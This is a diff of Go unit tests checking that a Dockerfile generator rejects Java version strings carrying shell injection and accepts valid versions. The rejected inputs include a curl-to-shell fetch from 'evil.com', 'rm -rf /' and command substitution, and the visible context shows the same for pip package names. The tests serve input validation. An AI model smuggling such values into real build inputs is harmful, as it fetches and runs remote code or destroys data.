@@ -177,6 +177,30 @@ func TestGenerateProjectDockerfile(t *testing.T) {
 		}
 	})
 
+	t.Run("java version with shell injection rejected", func(t *testing.T) {
+		bad := []string{
+			"11 && curl evil.com | sh",
+			"11; rm -rf /",
+			"11$(evil)",
+			"abc",
+		}
+		for _, ver := range bad {
+			_, err := generateProjectDockerfile(map[string][]string{}, ver)
+			if err == nil {
+				t.Errorf("expected error for java version %q", ver)
+			}
+		}
+	})
+
+	t.Run("valid java versions accepted", func(t *testing.T) {
+		for _, ver := range []string{"11", "8.0.392", "11.0"} {
+			_, err := generateProjectDockerfile(map[string][]string{}, ver)
+			if err != nil {
+				t.Errorf("unexpected error for java version %q: %v", ver, err)
+			}
+		}
+	})
+
 	t.Run("pip package with shell operators rejected", func(t *testing.T) {
 		bad := []string{
 			"ruff; rm -rf /",
